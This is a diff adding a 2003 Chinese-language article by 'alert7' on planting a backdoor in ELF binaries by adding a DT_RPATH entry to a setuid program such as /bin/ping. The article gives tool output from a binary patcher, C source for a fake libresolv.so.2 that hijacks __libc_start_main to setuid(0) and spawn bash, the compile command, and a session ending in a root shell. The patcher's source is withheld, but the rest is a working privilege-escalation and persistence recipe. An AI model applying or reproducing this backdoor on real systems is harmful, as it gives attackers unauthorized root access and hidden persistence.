@@ -1,0 +1,99 @@
+ELF后门之DT_RPATH篇
+by alert7
+2003年9月13日
+
+★★ DT_RPATH是什么？
+ 
+ Dynamic Section，该section包含了以下结构的一个数组。
++ Figure 2-9: Dynamic Structure
+
+typedef struct
+{
+  Elf32_Sword   d_tag;                  /* Dynamic entry type */
+  union
+    {
+      Elf32_Word d_val;                 /* Integer value */
+      Elf32_Addr d_ptr;                 /* Address value */
+    } d_un;
+} Elf32_Dyn;
+
+  extern Elf32_Dyn _DYNAMIC[];
+
+  其中Dynamic entry type有个叫DT_RPATH，它的解释如下：
+  该元素保存着以NULL结尾的搜索库的搜索目录字符串的字符串表偏移量。
+  
+ 
+ ★★ DT_RPATH能做什么
+
+  动态数组标记DT_RPATH保存着目录列表的字符串（用冒号(:)分隔）。
+  例如，字符串/home/dir/lib:/home/dir2/lib:告诉动态连接器先搜索
+  /home/dir/lib，再搜索/home/dir2/lib，再是当前目录。
+
+  LD_LIBRARY_PATH环境变量设置的目录在DT_RPATH指向的目录之后被搜索。
+
+  而且出于安全考虑，动态连接器忽略set-user和set-group的程序的
+LD_LIBRARY_PATH所指定的搜索目录。但它会搜索DT_RPATH指明的目录和
+/usr/lib。所以这个DT_RPATH还是比较感兴趣的。
+
+有了以上的基本知识，我们可以在一个set-user的程序上安装一个DT_RPATH入口（一般程序都没有）。
+让其搜索路径首先为当前目录。把我们自己编写的库以其名字放到当前目录下，更让其加栽我们自己的动态库。
+这样我们就可以得到set-user的权限了。
+
+
+★★ example
+
+[alert7@redhat9 root]# ls -la /bin/ping
+-rwsr-xr-x    1 root     root        28628 Sep 12 05:41 /bin/ping
+[alert7@redhat9 root]# ldd /bin/ping
+        libresolv.so.2 => /lib/libresolv.so.2 (0x40020000)
+        libc.so.6 => /lib/tls/libc.so.6 (0x42000000)
+        /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
+
+一：给ping安个后门
+[alert7@redhat9 root]# ./elfaddRPATH /bin/ping
+elfaddRPATH.c by alert7 <alert7@xfocus.org> or <alert7@whitecell.org>
+        add one DT_RPATH's Elf32_Dyn entry in dynamic section.
+Usage: elfaddRPATH elf_object <dynsym_name>
+        dynsym_name default _Jv_RegisterClasses ,or __gmon_start__
+[++]ELF format ok!
+[++]check Executable file...ok!
+[++]_Jv_RegisterClasses dynsym found!!!
+[++]modity _Jv_RegisterClasses dynsym to _Jv_RegisterClass\0: succeed!
+[++]dynamic section: contains 26 entries; 21 real entries
+[++]add one DT_RPATH's Elf32_Dyn in dynamic section succeed!
+
+二：自己编写一个动态库
+#include <stdlib.h>
+void __libc_start_main(void){
+        setuid(0);
+        seteuid(0);
+        execl("/bin/bash","bash",0,0);
+        exit(0);
+}
+EOF
+
+三：编译
+[alert7@redhat9 alert7]$ gcc -shared mylib.c -o libresolv.so.2
+截获了__libc_start_main，肯定能确保ping 程序放弃特权之前执行。（假如截获malloc之类的就不能确保了）。
+因为我们用到了一些libc.so.6中的函数，所以我们需要把我们自己的LIB以libresolv.so.2的名字存放在当前目录下。
+
+四：运行ping程序
+[alert7@redhat9 alert7]$ ping
+[alert7@redhat9 alert7]# id
+uid=0(root) gid=500(alert7) groups=500(alert7)
+OK，成功了~~~
+
+ROOT运行ping 程序就没有问题
+[alert7@redhat9 root]# ping 127.0.0.1
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.470 ms
+
+
+elfaddRPATH.c的SRC就不提供了，也不要向我索要，毕竟是做坏事的东东。
+这里提供一个思路，到此搁笔吧，接下来就要看自己了。
+
+
+参考资料：
+http://elfhack.whitecell.org/mydocs/ELF_chinese.txt
+
+---EOF-----
